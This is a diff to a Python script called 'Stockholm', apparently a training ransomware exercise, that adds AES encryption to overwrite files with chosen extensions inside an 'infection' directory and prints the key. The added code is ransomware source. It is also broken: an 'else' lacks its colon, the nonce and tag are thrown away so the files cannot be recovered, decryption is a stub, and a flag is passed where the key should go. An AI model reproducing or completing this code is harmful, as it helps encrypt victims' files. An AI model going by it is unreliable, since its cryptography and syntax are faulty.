@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 import argparse
 import os
+from Crypto.Cipher import AES
 
 VERSION = "1.0.0"
 TARGET_DIR = "infection"
@@ -20,6 +21,12 @@ def error_continue(msg):
 	print(f'Error:', msg)
 
 class Stockholm:
+	def __init__(self, key):
+		if key:
+			self.key = key
+		else
+			self.key = os.urandom(32)
+
 	def decrypt(self, contents):
 		try:
 			return contents
@@ -29,14 +36,16 @@ class Stockholm:
 
 	def encrypt(self, contents):
 		try:
-			return contents
+			cipher = AES.new(self.key, AES.MODE_EAX)
+			ciphertext, tag = cipher.encrypt_and_digest(contents)
+			# print(bytes.hex(ciphertext))
+			return ciphertext
 		except Exception as e:
 			error_exit(e)
-		return contents
 
 	def handle_target(self, file):
 		try:
-			with open(file, 'r+') as f:
+			with open(file, 'r+b') as f:
 				contents = f.read()
 				if Flags.reverse:
 					result = self.decrypt(contents)
@@ -60,7 +69,7 @@ class Stockholm:
 		for f in contents:
 			filename = dir_path + "/" + f
 			if not os.path.isfile(filename):
-				get_targets(filename, files, exts)
+				self.get_targets(filename, files, exts)
 			ext_idx = filename.rfind(".")
 			if ext_idx >= 0 and filename[ext_idx:] in exts:
 				files.append(filename)
@@ -101,6 +110,9 @@ class Stockholm:
 		for file in files:
 			self.handle_target(file)
 
+		if not Flags.reverse:
+			print(f"secret key: {bytes.hex(self.key)}")
+
 def parse_args():
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-v", "--version", action="store_true",
@@ -117,13 +129,14 @@ def parse_args():
 		Flags.reverse = True
 	if args.silent:
 		Flags.silent = True
+	return args
 
 def main():
-	parse_args()
+	args = parse_args()
 	if Flags.version:
 		print(f"Stockholm {VERSION}")
 	else:
-		stockholm = Stockholm()
+		stockholm = Stockholm(args.reverse)
 		stockholm.stockholm()
 	print(Flags.version, Flags.reverse, Flags.silent)
 
